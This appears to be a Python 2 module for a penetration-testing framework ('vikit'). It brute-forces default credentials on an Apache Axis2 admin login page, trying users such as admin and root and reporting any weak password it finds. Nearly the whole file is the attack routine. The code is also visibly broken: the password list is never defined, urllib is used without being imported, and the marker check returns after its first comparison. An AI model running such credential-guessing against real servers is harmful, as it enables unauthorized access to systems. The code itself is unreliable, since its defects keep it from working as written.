#!/usr/bin/env python
#coding:utf-8
"""
  Author:   --<v1ll4n>
  Purpose: Mod
  Created: 05/21/17
"""

import time
import urllib2

from vikit.core.basic.modinput import TargetDemand, PayloadDemand, ParamDemand
from vikit.core.basic import target, payload, param


NAME = 'axis_demo'

AUTHOR = 'vikit'

DESCRIPTION = 'description about a axis crack'

RESULT_DESC = '''this description is about result!'''

DEMANDS = [TargetDemand('target', target.TYPE_URL)]




def check(host, port, timeout):
    url = "http://%s:%d" % (host, int(port))
    error_i = 0
    flag_list = ['Administration Page</title>', 'System Components', '"axis2-admin/upload"',
                 'include page="footer.inc">', 'axis2-admin/logout']
    user_list = ['axis', 'admin', 'root']
    PASSWORD_DIC.append('axis2')
    for user in user_list:
        for password in PASSWORD_DIC:
            try:
                login_url = url + '/axis2/axis2-admin/login'
                PostStr = 'userName=%s&password=%s&submit=+Login+' % (user, password)
                request = urllib2.Request(login_url, PostStr)
                res = urllib2.urlopen(request, timeout=timeout)
                res_html = res.read()
            except urllib2.HTTPError, e:
                return
            except urllib2.URLError, e:
                error_i += 1
                if error_i >= 3:
                    return
                continue
            for flag in flag_list:
                if flag in res_html:
                    info = u'存在弱口令，用户名：%s，密码：%s' % (user, password)
                    return info
                else:
                	return False



#----------------------------------------------------------------------
def exploit(target, payload, config):
    # parse url to host and port
    timeout = 5
    proto, rest = urllib.splittype(target)
    host, rest = urllib.splithost(rest)
    host, port = urllib.splitport(host)
    if port is None:
        port = 80
    port=int(port)
    if check(host, port, timeout) != False:
        return 'success'
    else:
        return 'failed'


EXPORT_FUNC = exploit

if __name__ == '__main__':
    print exploit('http://192.168.1.183:8080','','{}')